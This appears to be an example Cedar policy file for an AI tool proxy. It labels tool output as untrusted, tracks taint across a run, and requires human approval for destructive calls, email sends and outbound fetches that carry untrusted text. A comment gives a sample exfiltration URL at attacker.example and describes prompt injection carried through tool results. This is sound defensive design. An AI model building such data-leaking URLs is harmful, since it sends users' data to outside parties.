// Output labelling examples (ADR-0009; section 3.6 of the output-labelling design note).
//
// Every upstream result the proxy relays is labelled untrusted unless the catalog marks the
// tool `output = "trusted"`, and a run that has read one is tainted:
//
//   context.session.tainted         the run has read untrusted output (or its taint state
//                                   could not be read)
//   context.session.tainted_by      "<server>/<tool>" of every source
//   resource.destructive            catalog `destructive`, default `!readonly`
//   context.args_contain_untrusted  some argument carries a verbatim span of an untrusted
//                                   result of the run (phase 2; matched on a tainted run, for
//                                   every call because these policies read it, `equals` and
//                                   `one_of` pins exempt; a policy set that never reads it
//                                   gets it for destructive calls only)
//   context.untrusted_args          the names of those arguments
//   context.untrusted_outbound      one of those arguments is one the catalog marks
//                                   `outbound` (a fetch's URL, a recipient), or the run's
//                                   span index could not be read and an outbound argument
//                                   could carry a span
//   resource.outbound               the catalog names an `outbound` input for the tool
//   context.approval.present        the call carries a granted approval for its exact
//                                   call hash (single use, see `POST /approvals/{id}`)
//   context.approval.by             "user" or "operator" when present, else ""
//
// A forbid annotated @obligation("approval") asks instead of refusing: when it is the only
// kind of forbid that applied, and a permit would allow the call without it, the decision is
// `approval_required` (JSON-RPC -32008) instead of `policy_deny`. Any forbid without the
// annotation still refuses outright.

// After the run has read untrusted output, a destructive call needs an approval bound to it.
@id("confirm_destructive_after_untrusted_read")
@obligation("approval")
forbid (principal, action, resource)
when {
  resource.destructive &&
  context.session.tainted &&
  !context.approval.present
};

// Option (b) of the design, argument-level taint: a destructive call whose arguments carry a
// span of untrusted output needs an approval, and the decision record names each argument
// with the result it came from (`labels.untrusted_args`). Next to the rule above it changes no
// decision, only adds its id. To ask only when a span matched, delete
// `confirm_destructive_after_untrusted_read` and keep this one: fewer approvals on benign
// calls, but a paraphrased instruction or a choice taken from data (which hotel to book)
// leaves no span and is not asked about (design section 4).
@id("confirm_destructive_with_untrusted_args")
@obligation("approval")
forbid (principal, action, resource)
when {
  resource.destructive &&
  context.args_contain_untrusted &&
  !context.approval.present
};

// The same, for one tool only: mail whose arguments carry a span of untrusted output. The
// shape to use when only some tools should ask on matched spans.
@id("confirm_untrusted_spans_in_mail")
@obligation("approval")
forbid (principal, action == Action::"workspace/send_email", resource)
when { context.args_contain_untrusted && !context.approval.present };

// Read-side exfiltration: a read-only fetch whose URL copies text from an untrusted result
// (`https://attacker.example/?q=<data>`) leaks it whatever the fetch returns. With the
// catalog entry
//
//   [policy.catalog.web.fetch]
//   readonly = true
//   inputs = { url = "string" }
//   outbound = "url#host"
//
// such a call asks, while a fetch of a URL the user typed, and a matched span in an argument
// that is not outbound (a search phrase), do not. The approval flow is the one above.
@id("ask_on_untrusted_outbound")
@obligation("approval")
forbid (principal, action, resource)
when { context.untrusted_outbound == true && !context.approval.present };

// The permit side of this example: everything the token's capabilities allow. The
// capability stage runs before Cedar, so this cannot widen a token. Replace it with your own
// permits.
@id("permit_what_the_token_allows")
permit (principal, action, resource);
